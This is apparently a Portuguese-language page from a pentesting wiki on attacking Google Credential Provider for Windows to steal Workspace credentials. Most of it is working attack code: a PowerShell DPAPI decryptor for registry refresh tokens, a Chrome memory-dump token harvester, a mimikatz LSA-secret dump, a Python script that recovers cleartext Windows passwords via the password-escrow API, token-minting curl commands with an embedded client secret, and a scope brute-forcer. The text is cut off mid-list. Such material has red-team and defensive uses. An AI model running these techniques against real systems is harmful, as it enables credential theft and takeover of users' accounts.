# GWS - Ataques de Sincroniza√ß√£o do Workspace (GCPW, GCDS, Sincroniza√ß√£o de Diret√≥rio com AD & EntraID)

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Suporte ao HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}

## GCPW - Google Credential Provider for Windows

Este √© o login √∫nico que o Google Workspaces fornece para que os usu√°rios possam fazer login em seus PCs com Windows usando **suas credenciais do Workspace**. Al√©m disso, isso armazenar√° tokens para acessar o Google Workspace em alguns lugares no PC.

{% hint style="success" %}
Observe que [**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe) √© capaz de detectar **GCPW**, obter informa√ß√µes sobre a configura√ß√£o e **at√© mesmo tokens**.
{% endhint %}

### GCPW - MitM

Quando um usu√°rio acessa um PC com Windows sincronizado com o Google Workspace via GCPW, ele precisar√° completar um formul√°rio de login comum. Este formul√°rio de login retornar√° um c√≥digo OAuth que o PC trocar√° pelo token de atualiza√ß√£o em uma solicita√ß√£o como:

{% code overflow="wrap" %}
```http
POST /oauth2/v4/token HTTP/2
Host: www.googleapis.com
Content-Length: 311
Content-Type: application/x-www-form-urlencoded
[...headers...]

scope=https://www.google.com/accounts/OAuthLogin
&grant_type=authorization_code
&client_id=77185425430.apps.googleusercontent.com
&client_secret=OTJgUOQcT7lO7GsGZq2G4IlT
&code=4/0AVG7fiQ1NKncRzNrrGjY5S02wBWBJxV9kUNSKvB1EnJDCWyDmfZvelqKp0zx8jRGmR7LUw
&device_id=d5c82f70-71ff-48e8-94db-312e64c7354f
&device_type=chrome
```
{% endcode %}

Novas linhas foram adicionadas para torn√°-lo mais leg√≠vel.

{% hint style="info" %}
Foi poss√≠vel realizar um MitM instalando o `Proxifier` no PC, sobrescrevendo o bin√°rio `utilman.exe` com um `cmd.exe` e executando os **recursos de acessibilidade** na p√°gina de login do Windows, que executar√° um **CMD** a partir do qual voc√™ pode **iniciar e configurar o Proxifier**.\
N√£o se esque√ßa de **bloquear o tr√°fego QUICK UDP** no `Proxifier` para que ele fa√ßa downgrade para comunica√ß√£o TCP e voc√™ possa v√™-lo.

Al√©m disso, configure em "Serviced and other users" ambas as op√ß√µes e instale o certificado CA do Burp no Windows.
{% endhint %}

Al√©m disso, adicionando as chaves `enable_verbose_logging = 1` e `log_file_path = C:\Public\gcpw.log` em **`HKLM:\SOFTWARE\Google\GCPW`** √© poss√≠vel fazer com que ele armazene alguns logs.

### GCPW - Impress√£o Digital

√â poss√≠vel verificar se o GCPW est√° instalado em um dispositivo verificando se o seguinte processo existe ou se as seguintes chaves de registro existem:
```powershell
# Check process gcpw_extension.exe
if (Get-Process -Name "gcpw_extension" -ErrorAction SilentlyContinue) {
Write-Output "The process gcpw_xtension.exe is running."
} else {
Write-Output "The process gcpw_xtension.exe is not running."
}

# Check if HKLM\SOFTWARE\Google\GCPW\Users exists
$gcpwHKLMPath = "HKLM:\SOFTWARE\Google\GCPW\Users"
if (Test-Path $gcpwHKLMPath) {
Write-Output "GCPW is installed: The key $gcpwHKLMPath exists."
} else {
Write-Output "GCPW is not installed: The key $gcpwHKLMPath does not exist."
}

# Check if HKCU\SOFTWARE\Google\Accounts exists
$gcpwHKCUPath = "HKCU:\SOFTWARE\Google\Accounts"
if (Test-Path $gcpwHKCUPath) {
Write-Output "Google Accounts are present: The key $gcpwHKCUPath exists."
} else {
Write-Output "No Google Accounts found: The key $gcpwHKCUPath does not exist."
}
```
Em **`HKCU:\SOFTWARE\Google\Accounts`** √© poss√≠vel acessar o e-mail do usu√°rio e o **refresh token** criptografado se o usu√°rio tiver feito login recentemente.

Em **`HKLM:\SOFTWARE\Google\GCPW\Users`** √© poss√≠vel encontrar os **dom√≠nios** que est√£o autorizados a fazer login na chave `domains_allowed` e, nas subchaves, √© poss√≠vel encontrar informa√ß√µes sobre o usu√°rio, como e-mail, foto, nome de usu√°rio, dura√ß√µes de token, identificador de token...

{% hint style="info" %}
O identificador de token √© um token que come√ßa com `eth.` e do qual pode ser extra√≠da algumas informa√ß√µes com uma solicita√ß√£o como:

{% code overflow="wrap" %}
```bash
curl -s 'https://www.googleapis.com/oauth2/v2/tokeninfo' \
-d 'token_handle=eth.ALh9Bwhhy_aDaRGhv4v81xRNXdt8BDrWYrM2DBv-aZwPdt7U54gp-m_3lEXsweSyUAuN3J-9KqzbDgHBfFzYqVink340uYtWAwxsXZgqFKrRGzmXZcJNVapkUpLVsYZ_F87B5P_iUzTG-sffD4_kkd0SEwZ0hSSgKVuLT-2eCY67qVKxfGvnfmg'
# Example response
{
"audience": "77185425430.apps.googleusercontent.com",
"scope": "https://www.google.com/accounts/OAuthLogin",
"expires_in": 12880152
}
```
{% endcode %}

Tamb√©m √© poss√≠vel encontrar o identificador do token de um token de acesso com uma solicita√ß√£o como:

{% code overflow="wrap" %}
```bash
curl -s 'https://www.googleapis.com/oauth2/v2/tokeninfo' \
-d 'access_token=<access token>'
# Example response
{
"issued_to": "77185425430.apps.googleusercontent.com",
"audience": "77185425430.apps.googleusercontent.com",
"scope": "https://www.google.com/accounts/OAuthLogin",
"expires_in": 1327,
"access_type": "offline",
"token_handle": "eth.ALh9Bwhhy_aDaRGhv4v81xRNXdt8BDrWYrM2DBv-aZwPdt7U54gp-m_3lEXsweSyUAuN3J-9KqzbDgHBfFzYqVink340uYtWAwxsXZgqFKrRGzmXZcJNVapkUpLVsYZ_F87B5P_iUzTG-sffD4_kkd0SEwZ0hSSgKVuLT-2eCY67qVKxfGvnfmg"
}
```
{% endcode %}

Afaik n√£o √© poss√≠vel obter um refresh token ou access token a partir do token handle.
{% endhint %}

Al√©m disso, o arquivo **`C:\ProgramData\Google\Credential Provider\Policies\<sid>\PolicyFetchResponse`** √© um json que cont√©m as informa√ß√µes de diferentes **configura√ß√µes** como `enableDmEnrollment`, `enableGcpAutoUpdate`, `enableMultiUserLogin` (se v√°rios usu√°rios do Workspace podem fazer login no computador) e `validityPeriodDays` (n√∫mero de dias que um usu√°rio n√£o precisa se reautenticar diretamente com o Google).

### GCPW - Tokens de Atualiza√ß√£o do Registro

Dentro do registro **`HKCU:\SOFTWARE\Google\Accounts`** pode ser poss√≠vel encontrar algumas contas com o **`refresh_token`** criptografado dentro. O m√©todo **`ProtectedData.Unprotect`** pode facilmente descriptograf√°-lo.

<details>

<summary>Obter <strong><code>HKCU:\SOFTWARE\Google\Accounts</code></strong> dados e descriptografar refresh_tokens</summary>
```powershell
# Import required namespace for decryption
Add-Type -AssemblyName System.Security

# Base registry path
$baseKey = "HKCU:\SOFTWARE\Google\Accounts"

# Function to search and decrypt refresh_token values
function Get-RegistryKeysAndDecryptTokens {
param (
[string]$keyPath
)

# Get all values within the current key
$registryKey = Get-Item -Path $keyPath
$foundToken = $false

# Loop through properties to find refresh_token
foreach ($property in $registryKey.Property) {
if ($property -eq "refresh_token") {
$foundToken = $true
try {
# Get the raw bytes of the refresh_token from the registry
$encryptedTokenBytes = (Get-ItemProperty -Path $keyPath -Name $property).$property

# Decrypt the bytes using ProtectedData.Unprotect
$decryptedTokenBytes = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedTokenBytes, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
$decryptedToken = [System.Text.Encoding]::UTF8.GetString($decryptedTokenBytes)

Write-Output "Path: $keyPath"
Write-Output "Decrypted refresh_token: $decryptedToken"
Write-Output "-----------------------------"
}
catch {
Write-Output "Path: $keyPath"
Write-Output "Failed to decrypt refresh_token: $($_.Exception.Message)"
Write-Output "-----------------------------"
}
}
}

# Recursively process all subkeys
Get-ChildItem -Path $keyPath | ForEach-Object {
Get-RegistryKeysAndDecryptTokens -keyPath $_.PSPath
}
}

# Start the search from the base key
Get-RegistryKeysAndDecryptTokens -keyPath $baseKey
```
</details>

Exemplo de sa√≠da:

{% code overflow="wrap" %}
```
Path: Microsoft.PowerShell.Core\Registry::HKEY_CURRENT_USER\SOFTWARE\Google\Accounts\100402336966965820570Decrypted refresh_token: 1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI
```
{% endcode %}

Conforme explicado em [**este v√≠deo**](https://www.youtube.com/watch?v=FEQxHRRP\_5I), se voc√™ n√£o encontrar o token no registro, √© poss√≠vel modificar o valor (ou deletar) de **`HKLM:\SOFTWARE\Google\GCPW\Users\<sid>\th`** e na pr√≥xima vez que o usu√°rio acessar o computador, ele precisar√° fazer login novamente e o **token ser√° armazenado no registro anterior**.

### GCPW - Tokens de Atualiza√ß√£o de Disco

O arquivo **`%LocalAppData%\Google\Chrome\User Data\Local State`** armazena a chave para descriptografar os **`refresh_tokens`** localizados dentro dos **perfis do Google Chrome** do usu√°rio, como:

* `%LocalAppData%\Google\Chrome\User Data\Default\Web Data`
* `%LocalAppData%\Google\Chrome\Profile*\Default\Web Data`

√â poss√≠vel encontrar algum **c√≥digo C#** acessando esses tokens de forma descriptografada em [**Winpeas**](https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS/winPEASexe).

Al√©m disso, a criptografia pode ser encontrada neste c√≥digo: [https://github.com/chromium/chromium/blob/7b5e817cb016f946a29378d2d39576a4ca546605/components/os\_crypt/sync/os\_crypt\_win.cc#L216](https://github.com/chromium/chromium/blob/7b5e817cb016f946a29378d2d39576a4ca546605/components/os\_crypt/sync/os\_crypt\_win.cc#L216)

Pode-se observar que AESGCM √© utilizado, o token criptografado come√ßa com uma **vers√£o** (**`v10`** neste momento), depois [**tem 12B de nonce**](https://github.com/chromium/chromium/blob/7b5e817cb016f946a29378d2d39576a4ca546605/components/os\_crypt/sync/os\_crypt\_win.cc#L42), e ent√£o possui o **texto cifrado** com um **mac final de 16B**.

### GCPW - Extraindo tokens da mem√≥ria dos processos

O seguinte script pode ser usado para **extrair** cada processo do **Chrome** usando `procdump`, extrair as **strings** e ent√£o **procurar** por strings relacionadas a **tokens de acesso e atualiza√ß√£o**. Se o Chrome estiver conectado a algum site do Google, algum **processo estar√° armazenando tokens de atualiza√ß√£o e/ou acesso na mem√≥ria!**

<details>

<summary>Extrair processos do Chrome e procurar tokens</summary>
```powershell
# Define paths for Procdump and Strings utilities
$procdumpPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\procdump.exe"
$stringsPath = "C:\Users\carlos_hacktricks\Desktop\SysinternalsSuite\strings.exe"
$dumpFolder = "C:\Users\Public\dumps"

# Regular expressions for tokens
$tokenRegexes = @(
"ya29\.[a-zA-Z0-9_\.\-]{50,}",
"1//[a-zA-Z0-9_\.\-]{50,}"
)

# Create a directory for the dumps if it doesn't exist
if (!(Test-Path $dumpFolder)) {
New-Item -Path $dumpFolder -ItemType Directory
}

# Get all Chrome process IDs
$chromeProcesses = Get-Process -Name "chrome" -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Id

# Dump each Chrome process
foreach ($processId in $chromeProcesses) {
Write-Output "Dumping process with PID: $processId"
& $procdumpPath -accepteula -ma $processId "$dumpFolder\chrome_$processId.dmp"
}

# Extract strings and search for tokens in each dump
Get-ChildItem $dumpFolder -Filter "*.dmp" | ForEach-Object {
$dumpFile = $_.FullName
$baseName = $_.BaseName
$asciiStringsFile = "$dumpFolder\${baseName}_ascii_strings.txt"
$unicodeStringsFile = "$dumpFolder\${baseName}_unicode_strings.txt"

Write-Output "Extracting strings from $dumpFile"
& $stringsPath -accepteula -n 50 -nobanner $dumpFile > $asciiStringsFile
& $stringsPath -accepteula -n 50 -nobanner -u $dumpFile > $unicodeStringsFile

$outputFiles = @($asciiStringsFile, $unicodeStringsFile)

foreach ($file in $outputFiles) {
foreach ($regex in $tokenRegexes) {

$matches = Select-String -Path $file -Pattern $regex -AllMatches

$uniqueMatches = @{}

foreach ($matchInfo in $matches) {
foreach ($match in $matchInfo.Matches) {
$matchValue = $match.Value
if (-not $uniqueMatches.ContainsKey($matchValue)) {
$uniqueMatches[$matchValue] = @{
LineNumber = $matchInfo.LineNumber
LineText   = $matchInfo.Line.Trim()
FilePath   = $matchInfo.Path
}
}
}
}

foreach ($matchValue in $uniqueMatches.Keys) {
$info = $uniqueMatches[$matchValue]
Write-Output "Match found in file '$($info.FilePath)' on line $($info.LineNumber): $($info.LineText)"
}
}

Write-Output ""
}
}

Remove-Item -Path $dumpFolder -Recurse -Force
```
</details>

Eu tentei o mesmo com `gcpw_extension.exe`, mas ele n√£o encontrou nenhum token.

Por algum motivo, **alguns tokens de acesso extra√≠dos n√£o ser√£o v√°lidos (embora alguns ser√£o)**. Eu tentei o seguinte script para remover caracteres um por um para tentar obter o token v√°lido do dump. Nunca me ajudou a encontrar um v√°lido, mas pode ser que ajude:

<details>

<summary>Verificar token de acesso removendo caracteres um por um</summary>
```bash
#!/bin/bash

# Define the initial access token
access_token="ya29.a0AcM612wWX6Pe3Pc6ApZYknGs5n66W1Hr1CQvF_L_pIm3uZaXWisWFabzxheYCHErRn28l2UOJuAbMzfn1TUpSKqvYvlhXJpxQsKEtwhYXzN2BZdOQNji0EXfF7po1_0WaxhwqOiE0CFQciiL8uAmkRsoXhq9ekC_S8xLrODZ2yKdDR6gSFULWaiIG-bOCFx3DkbOdbjAk-U4aN1WbglUAJdLZh7DMzSucIIZwKWvBxqqajSAjrdW0mRNVN2IfkcVLPndwj7fQJV2bQaCgYKAbQSAQ4SFQHGX2MiPuU1D-9-YHVzaFlUo_RwXA0277"

# Define the URL for the request
url="https://www.googleapis.com/oauth2/v1/tokeninfo"

# Loop until the token is 20 characters or the response doesn't contain "error_description"
while [ ${#access_token} -gt 20 ]; do
# Make the request and capture the response
response=$(curl -s -H "Content-Type: application/x-www-form-urlencoded" -d "access_token=$access_token" $url)

# Check if the response contains "error_description"
if [[ ! "$response" =~ "error_description" ]]; then
echo "Success: Token is valid"
echo "Final token: $access_token"
echo "Response: $response"
exit 0
fi

# Remove the last character from the token
access_token=${access_token:0:-1}

echo "Token length: ${#access_token}"
done

echo "Error: Token invalid or too short"
```
</details>

### GCPW - Recuperando a senha em texto claro

Para abusar do GCPW e recuperar o texto claro da senha, √© poss√≠vel despejar a senha criptografada do **LSASS** usando **mimikatz**:
```bash
mimikatz_trunk\x64\mimikatz.exe token::elevate lsadump::secrets exit
```
Ent√£o procure pelo segredo como `Chrome-GCPW-<sid>` como na imagem:

<figure><img src="../../.gitbook/assets/telegram-cloud-photo-size-4-6044191430395675441-x.jpg" alt=""><figcaption></figcaption></figure>

Ent√£o, com um **token de acesso** com o escopo `https://www.google.com/accounts/OAuthLogin`, √© poss√≠vel solicitar a chave privada para descriptografar a senha:

<details>

<summary>Script para obter a senha em texto claro dado o token de acesso, senha criptografada e id do recurso</summary>
```python
import requests
from base64 import b64decode
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.PublicKey import RSA

def get_decryption_key(access_token, resource_id):
try:
# Request to get the private key
response = requests.get(
f"https://devicepasswordescrowforwindows-pa.googleapis.com/v1/getprivatekey/{resource_id}",
headers={
"Authorization": f"Bearer {access_token}"
}
)

# Check if the response is successful
if response.status_code == 200:
private_key = response.json()["base64PrivateKey"]
# Properly format the RSA private key
private_key = f"-----BEGIN RSA PRIVATE KEY-----\n{private_key.strip()}\n-----END RSA PRIVATE KEY-----"
return private_key
else:
raise ValueError(f"Failed to retrieve private key: {response.text}")

except requests.RequestException as e:
print(f"Error occurred while requesting the private key: {e}")
return None

def decrypt_password(access_token, lsa_secret):
try:
# Obtain the private key using the resource_id
resource_id = lsa_secret["resource_id"]
encrypted_data = b64decode(lsa_secret["encrypted_password"])

private_key_pem = get_decryption_key(access_token, resource_id)
print("Found private key:")
print(private_key_pem)

if private_key_pem is None:
raise ValueError("Unable to retrieve the private key.")

# Load the RSA private key
rsa_key = RSA.import_key(private_key_pem)
key_size = int(rsa_key.size_in_bits() / 8)

# Decrypt the encrypted data
cipher_rsa = PKCS1_OAEP.new(rsa_key)
session_key = cipher_rsa.decrypt(encrypted_data[:key_size])

# Extract the session key and other data from decrypted payload
session_header = session_key[:32]
session_nonce = session_key[32:]
mac = encrypted_data[-16:]

# Decrypt the AES GCM data
aes_cipher = AES.new(session_header, AES.MODE_GCM, nonce=session_nonce)
decrypted_password = aes_cipher.decrypt_and_verify(encrypted_data[key_size:-16], mac)

print("Decrypted Password:", decrypted_password.decode("utf-8"))

except Exception as e:
print(f"Error occurred during decryption: {e}")

# CHANGE THIS INPUT DATA!
access_token = "<acces_token>"
lsa_secret = {
"encrypted_password": "<encrypted-password>",
"resource_id": "<resource-id>"
}

decrypt_password(access_token, lsa_secret)
```
</details>

√â poss√≠vel encontrar os componentes principais disso no c√≥digo-fonte do Chromium:

* Dom√≠nio da API: [https://github.com/search?q=repo%3Achromium%2Fchromium%20%22devicepasswordescrowforwindows-pa%22\&type=code](https://github.com/search?q=repo%3Achromium%2Fchromium%20%22devicepasswordescrowforwindows-pa%22\&type=code)
* Endpoint da API: [https://github.com/chromium/chromium/blob/21ab65accce03fd01050a096f536ca14c6040454/chrome/credential\_provider/gaiacp/password\_recovery\_manager.cc#L70](https://github.com/chromium/chromium/blob/21ab65accce03fd01050a096f536ca14c6040454/chrome/credential\_provider/gaiacp/password\_recovery\_manager.cc#L70)

### GCPW - Gerando tokens de acesso a partir de tokens de atualiza√ß√£o

Usando o token de atualiza√ß√£o, √© poss√≠vel gerar tokens de acesso usando-o e o ID do cliente e o segredo do cliente especificados no seguinte comando:
```bash
curl -s --data "client_id=77185425430.apps.googleusercontent.com" \
--data "client_secret=OTJgUOQcT7lO7GsGZq2G4IlT" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
https://www.googleapis.com/oauth2/v4/token
```
### GCPW - Escopos

{% hint style="info" %}
Observe que, mesmo tendo um token de atualiza√ß√£o, n√£o √© poss√≠vel solicitar nenhum escopo para o token de acesso, pois voc√™ s√≥ pode solicitar os **escopos suportados pela aplica√ß√£o onde voc√™ est√° gerando o token de acesso**.

Al√©m disso, o token de atualiza√ß√£o n√£o √© v√°lido em todas as aplica√ß√µes.
{% endhint %}

Por padr√£o, o GCPW n√£o ter√° acesso como o usu√°rio a todos os poss√≠veis escopos OAuth, ent√£o, usando o seguinte script, podemos encontrar os escopos que podem ser usados com o `refresh_token` para gerar um `access_token`:

<details>

<summary>Script Bash para for√ßa bruta de escopos</summary>
```bash
curl "https://developers.google.com/identity/protocols/oauth2/scopes" | grep -oE 'https://www.googleapis.com/auth/[a-zA-Z/\._\-]*' | sort -u | while read -r scope; do
echo -ne "Testing $scope           \r"
if ! curl -s --data "client_id=77185425430.apps.googleusercontent.com" \
--data "client_secret=OTJgUOQcT7lO7GsGZq2G4IlT" \
--data "grant_type=refresh_token" \
--data "refresh_token=1//03gQU44mwVnU4CDHYE736TGMSNwF-L9IrTuikNFVZQ3sBxshrJaki7QvpHZQMeANHrF0eIPebz0dz0S987354AuSdX38LySlWflI" \
--data "scope=$scope" \
https://www.googleapis.com/oauth2/v4/token 2>&1 | grep -q "error_description"; then
echo ""
echo $scope
echo $scope >> /tmp/valid_scopes.txt
fi
done

echo ""
echo ""
echo "Valid scopes:"
cat /tmp/valid_scopes.txt
rm /tmp/valid_scopes.txt
```
</details>

E este √© o resultado que obtive no momento da escrita:
```
Valid scopes:
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
```
Al√©m disso, verificando o c√≥digo-fonte do Chromium, √© poss√≠vel [**encontrar este arquivo**](https://github.com/chromium/chromium/blob/5301790cd7ef97088d4862465822da4cb2d95591/google\_apis/gaia/gaia\_constants.cc#L24), que cont√©m **outros escopos** que pode-se assumir que **n√£o aparecem na lista anteriormente for√ßada por brute force**. Portanto, esses escopos extras podem ser assumidos:

<details>

<summary>Escopos extras</summary>
```
https://www.google.com/accounts/OAuthLogin
https://www.googleapis.com/auth/account.capabilities
https://www.googleapis.com/auth/accounts.programmaticchallenge
https://www.googleapis.com/auth/accounts.reauth
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/aida
https://www.googleapis.com/auth/aidahttps://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/android_checkin
https://www.googleapis.com/auth/any-api
https://www.googleapis.com/auth/assistant-sdk-prototype
https://www.googleapis.com/auth/auditrecording-pa
https://www.googleapis.com/auth/bce.secureconnect
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/cast.backdrop
https://www.googleapis.com/auth/cclog
https://www.googleapis.com/auth/chrome-model-execution
https://www.googleapis.com/auth/chrome-optimization-guide
https://www.googleapis.com/auth/chrome-safe-browsing
https://www.googleapis.com/auth/chromekanonymity
https://www.googleapis.com/auth/chromeosdevicemanagement
https://www.googleapis.com/auth/chromesync
https://www.googleapis.com/auth/chromewebstore.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/cryptauth
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/experimentsandconfigs
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/gcm
https://www.googleapis.com/auth/googlenow
https://www.googleapis.com/auth/googletalk
https://www.googleapis.com/auth/identity.passwords.leak.check
https://www.googleapis.com/auth/ip-protection
https://www.googleapis.com/auth/kid.family.readonly
https://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/kid.permission
https://www.googleapis.com/auth/kids.parentapproval
https://www.googleapis.com/auth/kids.supervision.setup.child
https://www.googleapis.com/auth/lens
https://www.googleapis.com/auth/music
https://www.googleapis.com/auth/nearbydevices-pa
https://www.googleapis.com/auth/nearbypresence-pa
https://www.googleapis.com/auth/nearbysharing-pa
https://www.googleapis.com/auth/peopleapi.readonly
https://www.googleapis.com/auth/peopleapi.readwrite
https://www.googleapis.com/auth/photos
https://www.googleapis.com/auth/photos.firstparty.readonly
https://www.googleapis.com/auth/photos.image.readonly
https://www.googleapis.com/auth/profile.language.read
https://www.googleapis.com/auth/secureidentity.action
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/supportcontent
https://www.googleapis.com/auth/tachyon
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
https://www.googleapis.com/auth/wallet.chrome
```
</details>

Observe que o mais interessante √© possivelmente:
```c
// OAuth2 scope for access to all Google APIs.
const char kAnyApiOAuth2Scope[] = "https://www.googleapis.com/auth/any-api";
```
No entanto, tentei usar esse escopo para acessar o gmail ou listar grupos e n√£o funcionou, ent√£o n√£o sei qu√£o √∫til ainda √©.

**Obter um token de acesso com todos esses escopos**:

<details>

<summary>Script Bash para gerar token de acesso a partir de refresh_token com todos os escopos</summary>
```bash
export scope=$(echo "https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/spreadsheets
https://www.googleapis.com/auth/tasks
https://www.googleapis.com/auth/tasks.readonly
https://www.googleapis.com/auth/userinfo.email
https://www.googleapis.com/auth/userinfo.profile
https://www.google.com/accounts/OAuthLogin
https://www.googleapis.com/auth/account.capabilities
https://www.googleapis.com/auth/accounts.programmaticchallenge
https://www.googleapis.com/auth/accounts.reauth
https://www.googleapis.com/auth/admin.directory.user
https://www.googleapis.com/auth/aida
https://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/android_checkin
https://www.googleapis.com/auth/any-api
https://www.googleapis.com/auth/assistant-sdk-prototype
https://www.googleapis.com/auth/auditrecording-pa
https://www.googleapis.com/auth/bce.secureconnect
https://www.googleapis.com/auth/calendar
https://www.googleapis.com/auth/calendar.events
https://www.googleapis.com/auth/calendar.events.readonly
https://www.googleapis.com/auth/calendar.readonly
https://www.googleapis.com/auth/cast.backdrop
https://www.googleapis.com/auth/cclog
https://www.googleapis.com/auth/chrome-model-execution
https://www.googleapis.com/auth/chrome-optimization-guide
https://www.googleapis.com/auth/chrome-safe-browsing
https://www.googleapis.com/auth/chromekanonymity
https://www.googleapis.com/auth/chromeosdevicemanagement
https://www.googleapis.com/auth/chromesync
https://www.googleapis.com/auth/chromewebstore.readonly
https://www.googleapis.com/auth/classroom.courses.readonly
https://www.googleapis.com/auth/classroom.coursework.me.readonly
https://www.googleapis.com/auth/classroom.coursework.students.readonly
https://www.googleapis.com/auth/classroom.profile.emails
https://www.googleapis.com/auth/classroom.profile.photos
https://www.googleapis.com/auth/classroom.rosters.readonly
https://www.googleapis.com/auth/classroom.student-submissions.me.readonly
https://www.googleapis.com/auth/classroom.student-submissions.students.readonly
https://www.googleapis.com/auth/cloud-translation
https://www.googleapis.com/auth/cloud_search.query
https://www.googleapis.com/auth/cryptauth
https://www.googleapis.com/auth/devstorage.read_write
https://www.googleapis.com/auth/drive
https://www.googleapis.com/auth/drive.apps.readonly
https://www.googleapis.com/auth/drive.file
https://www.googleapis.com/auth/drive.readonly
https://www.googleapis.com/auth/ediscovery
https://www.googleapis.com/auth/experimentsandconfigs
https://www.googleapis.com/auth/firebase.messaging
https://www.googleapis.com/auth/gcm
https://www.googleapis.com/auth/googlenow
https://www.googleapis.com/auth/googletalk
https://www.googleapis.com/auth/identity.passwords.leak.check
https://www.googleapis.com/auth/ip-protection
https://www.googleapis.com/auth/kid.family.readonly
https://www.googleapis.com/auth/kid.management.privileged
https://www.googleapis.com/auth/kid.permission
https://www.googleapis.com/auth/kids.parentapproval
https://www.googleapis.com/auth/kids.supervision.setup.child
https://www.googleapis.com/auth/lens
https://www.googleapis.com/auth/music
https://www.googleapis.com/auth/nearbydevices-pa
https://www.googleapis.com/auth/nearbypresence-pa
https://www.googleapis.com/auth/nearbysharing-pa
https://www.googleapis.com/auth/peopleapi.readonly
https://www.googleapis.com/auth/peopleapi.readwrite
